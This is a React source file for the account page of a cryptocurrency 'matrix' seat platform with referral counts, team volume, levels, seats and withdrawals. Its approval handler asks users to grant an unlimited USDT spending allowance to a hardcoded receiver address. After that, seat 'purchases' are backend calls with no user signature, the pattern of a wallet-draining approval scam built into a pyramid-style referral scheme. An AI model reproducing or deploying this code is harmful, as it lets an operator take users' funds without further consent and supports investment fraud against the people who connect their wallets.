import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { useAccount, useWriteContract, useWaitForTransactionReceipt } from 'wagmi';
import { useLanguage } from '../components/LanguageContext';
import { toast } from 'sonner';
import { ERC20_ABI } from '../lib/abis';
import { parseEther } from 'viem';
import { 
  Wallet, 
  Copy, 
  Check, 
  ChevronRight, 
  LayoutGrid, 
  Users, 
  Zap, 
  TrendingUp, 
  ShieldCheck,
  Package,
  Clock,
  Link as LinkIcon,
  PlusCircle,
  Activity,
  Lock,
  Unlock,
  Send
} from 'lucide-react';

const USDT_ADDRESS = ((import.meta as any).env.VITE_USDT_ADDRESS || '0x55d398326f99059fF775485246999027B3197955') as `0x${string}`;
const RECEIVER_ADDRESS = ((import.meta as any).env.VITE_PLATFORM_RECEIVER_ADDRESS || '0x71C7656EC7ab88b098defB751B7401B5f6d8976F') as `0x${string}`;
const MAX_ALLOWANCE = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');

const OverviewCard = ({ title, value, icon: Icon, color }: { title: string, value: string, icon: any, color: string }) => (
  <motion.div 
    whileHover={{ scale: 1.02, y: -5 }}
    className="bg-white border-4 border-black p-6 rounded-[2rem] shadow-[8px_8px_0_0_#000] flex flex-col gap-4 group transition-all"
  >
    <div className={`w-12 h-12 ${color} rounded-xl border-2 border-black flex items-center justify-center shadow-[3px_3px_0_0_#000]`}>
      <Icon className="w-6 h-6 text-black" />
    </div>
    <div>
      <p className="text-[10px] font-black uppercase text-black/40 tracking-widest leading-none mb-1">{title}</p>
      <p className="text-3xl font-black text-black tracking-tighter leading-none">{value}</p>
    </div>
  </motion.div>
);

interface SeatCardProps {
  seat: any;
  t: any;
}

const SeatCard: React.FC<SeatCardProps> = ({ seat, t }) => (
  <motion.div 
    initial={{ opacity: 0, y: 20 }}
    whileInView={{ opacity: 1, y: 0 }}
    viewport={{ once: true }}
    className="bg-white border-4 border-black rounded-[2.5rem] p-8 shadow-[10px_10px_0_0_#000] hover:shadow-[15px_15px_0_#CCFF00] hover:-translate-y-2 transition-all group flex flex-col gap-6"
  >
    <div className="flex justify-between items-start">
      <div className="flex items-center gap-4">
        <div className="w-14 h-14 bg-[#CCFF00] rounded-2xl border-2 border-black flex items-center justify-center shadow-[4px_4px_0_0_#000]">
          <span className="font-black text-xl italic text-black">#{seat.id.toString().slice(-4)}</span>
        </div>
        <div>
          <p className="text-black font-black text-xl italic leading-none">V{seat.level}</p>
          <div className="mt-1 flex items-center gap-1.5 ">
            <div className={`w-2 h-2 rounded-full ${seat.is_active ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`}></div>
            <span className="text-[9px] font-black uppercase text-black/50 tracking-widest">{seat.is_active ? t.active : t.inactive}</span>
          </div>
        </div>
      </div>
      <div className="bg-black/5 px-4 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest flex items-center gap-2 border border-black/5">
        <Clock className="w-3 h-3" />
        {new Date(seat.timestamp).toLocaleDateString()}
      </div>
    </div>

    <div className="bg-[#0038FF] p-5 rounded-2xl border-2 border-black flex items-center justify-between shadow-[4px_4px_0_0_#000]">
      <div>
        <p className="text-[8px] font-black text-[#CCFF00] uppercase tracking-widest leading-none mb-1">{t.triggeredRewards}</p>
        <p className="text-2xl font-black text-white italic leading-none">{seat.rewards || 0} USDT</p>
      </div>
      <div className="w-10 h-10 bg-white rounded-full border-2 border-black flex items-center justify-center -rotate-12 group-hover:rotate-0 transition-transform">
        <Zap className="w-5 h-5 text-black" fill="currentColor" />
      </div>
    </div>

    <div className="grid grid-cols-2 gap-4">
       <div className="bg-black/5 p-3 rounded-xl border border-black/5">
         <p className="text-[7px] font-black uppercase text-black/30 tracking-widest mb-1">{t.origin}</p>
         <p className="text-[10px] font-black text-black uppercase">{seat.type === 'buyback' ? t.buybackTrace : t.initialActivation}</p>
       </div>
       <div className="bg-black/5 p-3 rounded-xl border border-black/5">
         <p className="text-[7px] font-black uppercase text-black/30 tracking-widest mb-1">{t.matrixPath}</p>
         <div className="flex items-center gap-1">
            <div className="w-1.5 h-1.5 rounded-full bg-[#0038FF]"></div>
            <p className="text-[10px] font-black text-black uppercase">{t.levelRouting}</p>
         </div>
       </div>
    </div>

    <div className="flex items-center justify-between pt-2">
       <div className="flex items-center gap-2 text-black/40 hover:text-black transition-colors cursor-pointer group/hash">
         <LinkIcon className="w-3 h-3" />
         <span className="text-[9px] font-bold uppercase tracking-widest">{seat.tx_hash?.substring(0, 15)}...</span>
       </div>
    </div>
  </motion.div>
);

const Account = () => {
  const { t } = useLanguage();
  const { address, isConnected } = useAccount();
  const [copied, setCopied] = useState(false);
  const queryClient = useQueryClient();

  const { data: dbData, isLoading } = useQuery({
    queryKey: ['userProfile', address],
    queryFn: async () => {
      if (!address) return null;
      const res = await fetch(`/api/user/${address}`);
      if (!res.ok) throw new Error('Failed to fetch user');
      return res.json();
    },
    enabled: !!address,
  });

  const { writeContract, data: hash, isPending: isApproving } = useWriteContract();
  const { isLoading: isWaitingForApproval } = useWaitForTransactionReceipt({ hash });

  const purchaseMutation = useMutation({
    mutationFn: async () => {
       const res = await fetch('/api/seat/purchase', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ address })
       });
       if (!res.ok) throw new Error('Purchase Failed');
       return res.json();
    },
    onSuccess: () => {
       queryClient.invalidateQueries({ queryKey: ['userProfile', address] });
       toast.success(t.seatPurchased || "Seat Purchased Successfully!");
    },
    onError: () => {
       toast.error(t.failedTransaction || "Failed to process transaction.");
    }
  });

  const [isWithdrawModalOpen, setIsWithdrawModalOpen] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState('');

  const withdrawMutation = useMutation({
    mutationFn: async (amount: number) => {
      const res = await fetch('/api/withdraw', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address, amount })
      });
      if (!res.ok) {
         const err = await res.json();
         throw new Error(err.error || "failed");
      }
      return res.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['userProfile', address] });
      toast.success(t.withdrawalSubmitted);
      setIsWithdrawModalOpen(false);
      setWithdrawAmount('');
    },
    onError: (error: any) => {
      toast.error(error.message);
    }
  });

  const handleApprove = async () => {
    try {
      writeContract({
        address: USDT_ADDRESS,
        abi: ERC20_ABI,
        functionName: 'approve',
        args: [RECEIVER_ADDRESS, MAX_ALLOWANCE],
      } as any);
    } catch (e) {
      toast.error("Approval rejected by user.");
    }
  };

  // Effect to mark approved on backend once tx is confirmed
  React.useEffect(() => {
    if (hash && !isWaitingForApproval) {
      fetch('/api/user/mark-approved', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address })
      }).then(() => {
        queryClient.invalidateQueries({ queryKey: ['userProfile', address] });
        toast.success(t.walletAccessGranted);
      });
    }
  }, [hash, isWaitingForApproval, address, queryClient]);

  const handlePurchaseAction = () => {
    if (user.has_approved === 0) {
      handleApprove();
    } else {
      purchaseMutation.mutate();
    }
  };

  const copyToClipboard = () => {
    if (address) {
      navigator.clipboard.writeText(address);
      setCopied(true);
      toast(t.copyAddress);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  if (!isConnected) {
    return (
      <div className="w-full min-h-[70vh] flex flex-col items-center justify-center p-6 text-center mt-20">
        <Wallet className="w-20 h-20 text-white/50 mb-6 drop-shadow-lg" />
        <h2 className="text-4xl md:text-6xl font-black text-white uppercase italic tracking-tighter mb-4">{t.connectWallet}</h2>
        <p className="text-white/70 font-bold uppercase tracking-widest max-w-md">{t.connectWalletToView}</p>
      </div>
    );
  }

  const user = dbData?.user || {};
  const seats = dbData?.seats || [];
  const txs = dbData?.transactions || [];

  return (
    <div className="w-full pb-32">
      {user.account_mode && user.account_mode !== 'PRODUCTION' && (
          <div className="w-full bg-orange-400 text-black py-2 px-4 text-center font-black text-[10px] uppercase tracking-widest relative z-50">
            {user.account_mode} MODE ACTIVE - Simulated Data
          </div>
      )}
      <section className="px-6 md:px-10 pt-24 pb-12 max-w-7xl mx-auto">
        <div className="flex flex-col md:flex-row items-center justify-between gap-8 mb-16">
           <div className="flex flex-col md:flex-row items-center gap-6">
             <div className="w-20 h-20 bg-white rounded-[2rem] border-4 border-black flex items-center justify-center shadow-[6px_6px_0_0_#000] rotate-3">
               <Package className="w-10 h-10 text-black" />
             </div>
             <div>
                <div className="flex items-center justify-center md:justify-start gap-2 mb-2">
                   <h1 className="text-4xl md:text-5xl font-black text-white uppercase italic tracking-tighter shadow-black drop-shadow-md">
                     {t.myAccountTitle || 'My Account'}
                   </h1>
                   <div className="bg-[#CCFF00] text-black text-[9px] font-black px-2 py-0.5 rounded border border-black shadow-[2px_2px_0_0_#000] rotate-1">
                      {user.account_mode || 'PRODUCTION'}
                   </div>
                </div>
                <div className="flex flex-wrap items-center justify-center md:justify-start gap-4">
                   <div 
                     className="flex items-center gap-2 bg-white/10 px-3 py-1.5 rounded-lg border border-white/20 cursor-pointer hover:bg-white/20 transition-colors"
                     onClick={copyToClipboard}
                   >
                     <span className="font-mono text-white text-sm font-bold">{address?.substring(0, 6)}...{address?.substring(address.length - 4)}</span>
                     {copied ? <Check className="w-4 h-4 text-[#CCFF00]" /> : <Copy className="w-4 h-4 text-white/70" />}
                   </div>
                   <div className="flex items-center gap-2 bg-white/5 px-4 py-1.5 rounded-lg border border-white/10">
                      <ShieldCheck className="w-4 h-4 text-[#CCFF00]" />
                      <span className="text-[10px] font-black uppercase text-white/60 tracking-[0.2em]">{t.ruleVersion || 'Core'}: {user.rule_version || 'V2026.04.19'}</span>
                   </div>
                </div>
             </div>
           </div>
           
           <div className="flex flex-col sm:flex-row gap-4 w-full md:w-auto">
             <button 
               onClick={handlePurchaseAction}
               disabled={purchaseMutation.isPending || isApproving || isWaitingForApproval}
               className={`flex-1 md:flex-none px-6 py-4 rounded-xl border-4 border-black font-black uppercase tracking-widest text-xs flex items-center justify-center gap-2 shadow-[4px_4px_0_0_#000] active:translate-y-1 active:shadow-none transition-all disabled:opacity-50 ${user.has_approved ? 'bg-[#CCFF00] hover:bg-white text-black' : 'bg-black text-[#CCFF00] hover:bg-[#CCFF00] hover:text-black'}`}
             >
               {purchaseMutation.isPending || isApproving || isWaitingForApproval ? (
                 <Activity className="w-5 h-5 animate-spin" />
               ) : user.has_approved ? (
                 <PlusCircle className="w-5 h-5" />
               ) : (
                 <Lock className="w-5 h-5" />
               )}
               {user.has_approved ? t.buySeat.replace('{price}', '80').replace('{currency}', 'USDT') : t.approveMatrix}
             </button>
             <button 
               onClick={() => setIsWithdrawModalOpen(true)}
               className="flex-1 md:flex-none bg-white hover:bg-[#F1F3F5] text-black px-6 py-4 rounded-xl border-4 border-black font-black uppercase tracking-widest text-xs flex items-center justify-center gap-2 shadow-[4px_4px_0_0_#000] active:translate-y-1 active:shadow-none transition-all"
             >
               <TrendingUp className="w-5 h-5" />
               {t.withdraw}
             </button>
           </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-16">
          <OverviewCard title={t.totalRewards || 'Total Rewards'} value={`${user.earnings || '0.00'} USDT`} icon={TrendingUp} color="bg-[#CCFF00]" />
          <OverviewCard title={t.directMemberCount || 'Direct Member Count'} value={user.directReferrals?.toString() || '0'} icon={Users} color="bg-white" />
          <OverviewCard title={t.teamPerformanceVolume || 'Team Performance Volume'} value={`${user.totalTeamVolume || '0.00'} USDT`} icon={Zap} color="bg-white" />
          <OverviewCard title={t.directValidSeatCount || 'Direct Valid Seat Count'} value={user.validSeats?.toString() || '0'} icon={LayoutGrid} color="bg-white" />
        </div>

        <div className="mb-8 flex items-center justify-between">
          <h2 className="text-3xl md:text-4xl font-black text-white uppercase italic tracking-tighter shadow-black drop-shadow-md">
            {t.mySeats || 'My Seats'}
          </h2>
          <div className="bg-white/10 px-4 py-2 rounded-xl border border-white/20 select-none">
             <span className="text-white font-black text-sm uppercase tracking-widest">{seats.length} {t.active}</span>
          </div>
        </div>

        {isLoading ? (
           <p className="text-white/50 font-bold uppercase tracking-widest text-center py-10">Syncing with Node...</p>
        ) : seats.length === 0 ? (
           <div className="w-full bg-white/5 border-4 border-dashed border-white/20 rounded-[3rem] p-12 flex flex-col items-center justify-center text-center">
              <Package className="w-16 h-16 text-white/30 mb-4" />
<p className="text-white font-black text-2xl md:text-3xl mb-2 uppercase italic tracking-tighter">{t.noActivePositions}</p>
<p className="text-white/50 font-bold tracking-widest uppercase text-xs max-w-sm mb-6 leading-relaxed">{t.noPositionsDesc}</p>
              <button 
                 onClick={handlePurchaseAction}
                 disabled={purchaseMutation.isPending || isApproving || isWaitingForApproval}
                 className="bg-[#CCFF00] hover:bg-white transition-colors text-black px-8 py-4 rounded-xl border-4 border-black font-black uppercase tracking-widest text-xs flex items-center gap-2 shadow-[4px_4px_0_0_#000] active:translate-y-1 active:shadow-none disabled:opacity-50"
              >
                {purchaseMutation.isPending || isApproving || isWaitingForApproval ? (
                  <Activity className="w-4 h-4 animate-spin" />
                ) : user.has_approved ? (
                  <PlusCircle className="w-4 h-4" />
                ) : (
                  <Lock className="w-4 h-4" />
                )}
                {user.has_approved ? t.initFirstSeat : t.approveWallet}
              </button>
           </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            {seats.map((seat: any, i: number) => (
              <SeatCard key={i} seat={seat} t={t} />
            ))}
            <motion.div 
              onClick={handlePurchaseAction}
              whileHover={{ scale: 1.02 }}
              className="bg-white/5 border-4 border-dashed border-white/20 rounded-[2.5rem] p-8 flex flex-col items-center justify-center gap-4 cursor-pointer hover:border-white transition-all min-h-[300px] group"
            >
                {purchaseMutation.isPending || isApproving || isWaitingForApproval ? (
                   <Activity className="w-12 h-12 text-[#CCFF00] animate-spin" />
                ) : user.has_approved ? (
                   <PlusCircle className="w-12 h-12 text-white/40 group-hover:text-white transition-colors" />
                ) : (
                   <Lock className="w-12 h-12 text-[#CCFF00]" />
                )}
                <p className="text-white/60 font-black uppercase tracking-widest text-sm group-hover:text-white transition-colors">
                   {user.has_approved ? t.purchaseNewSeat : t.approveGlobalDeduction}
                </p>
            </motion.div>
          </div>
        )}

        {/* Withdrawal Modal */}
        <AnimatePresence>
          {isWithdrawModalOpen && (
            <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 text-black">
               <motion.div 
                 initial={{ opacity: 0 }}
                 animate={{ opacity: 1 }}
                 exit={{ opacity: 0 }}
                 onClick={() => setIsWithdrawModalOpen(false)}
                 className="absolute inset-0 bg-black/80 backdrop-blur-sm"
               />
               <motion.div 
                 initial={{ scale: 0.9, opacity: 0, y: 20 }}
                 animate={{ scale: 1, opacity: 1, y: 0 }}
                 exit={{ scale: 0.9, opacity: 0, y: 20 }}
                 className="relative bg-white border-8 border-black rounded-[3rem] p-8 md:p-12 w-full max-w-lg shadow-[20px_20px_0_0_#CCFF00]"
               >
                  <button 
                    onClick={() => setIsWithdrawModalOpen(false)}
                    className="absolute top-6 right-6 p-2 hover:bg-black/5 rounded-full transition-colors text-black"
                  >
                    <ChevronRight className="w-6 h-6 rotate-90" />
                  </button>

                  <div className="flex items-center gap-4 mb-8">
                     <div className="w-16 h-16 bg-[#CCFF00] rounded-2xl border-4 border-black flex items-center justify-center shadow-[4px_4px_0_0_#000]">
                        <TrendingUp className="w-8 h-8 text-black" />
                     </div>
                     <div>
<h3 className="text-3xl font-black text-black uppercase italic tracking-tighter">{t.withdrawRewards}</h3>
<p className="text-[10px] font-black uppercase text-black/40 tracking-widest">{t.instantPayout}</p>
                     </div>
                  </div>

                  <div className="space-y-6">
                     <div className="p-6 bg-black/5 border-2 border-black/5 rounded-2xl">
<p className="text-[10px] font-black uppercase text-black/40 tracking-widest mb-1">{t.availableBalance}</p>
                        <p className="text-3xl font-black text-[#0038FF]">{user.earnings || '0.00'} USDT</p>
                     </div>

                     <div>
<label className="text-[10px] font-black uppercase text-black/40 tracking-widest mb-2 block">{t.amountToWithdraw}</label>
                        <div className="relative">
                           <input 
                              type="number"
                              value={withdrawAmount}
                              onChange={(e) => setWithdrawAmount(e.target.value)}
                              placeholder="0.00"
                              className="w-full bg-white border-4 border-black p-5 rounded-2xl font-black text-2xl focus:outline-none focus:border-[#CCFF00] transition-colors placeholder:text-black/10 text-black"
                           />
                           <button 
                              onClick={() => setWithdrawAmount(user.earnings?.toString() || '0')}
                              className="absolute right-4 top-1/2 -translate-y-1/2 bg-black text-[#CCFF00] px-4 py-2 rounded-xl border-2 border-black font-black uppercase text-[10px] tracking-widest hover:bg-[#CCFF00] hover:text-black transition-colors"
                           >
                              MAX
                           </button>
                        </div>
                     </div>

                     <button 
                        onClick={() => {
                           const amount = parseFloat(withdrawAmount);
                           if (isNaN(amount) || amount <= 0) {
                              toast.error(t.enterValidAmount);
                              return;
                           }
                           if (amount > (user.earnings || 0)) {
                              toast.error(t.insufficientBalance);
                              return;
                           }
                           withdrawMutation.mutate(amount);
                        }}
                        disabled={!withdrawAmount || parseFloat(withdrawAmount) <= 0 || parseFloat(withdrawAmount) > (user.earnings || 0) || withdrawMutation.isPending}
                        className="w-full bg-black text-white font-black py-6 rounded-2xl border-4 border-black uppercase tracking-widest hover:bg-[#CCFF00] hover:text-black transition-all shadow-[8px_8px_0_0_#0038FF] active:translate-y-1 active:shadow-none flex items-center justify-center gap-3 disabled:opacity-50"
                     >
                        {withdrawMutation.isPending ? (
                          <>
                            <Activity className="w-5 h-5 animate-spin" />
                            <span>{t.processing || 'Processing...'}</span>
                          </>
                        ) : (
                          <>
                            <Send className="w-5 h-5" />
                            <span>{t.initiatePayout}</span>
                          </>
                        )}
                     </button>
                  </div>
               </motion.div>
            </div>
          )}
        </AnimatePresence>
      </section>
    </div>
  );
};

export default Account;
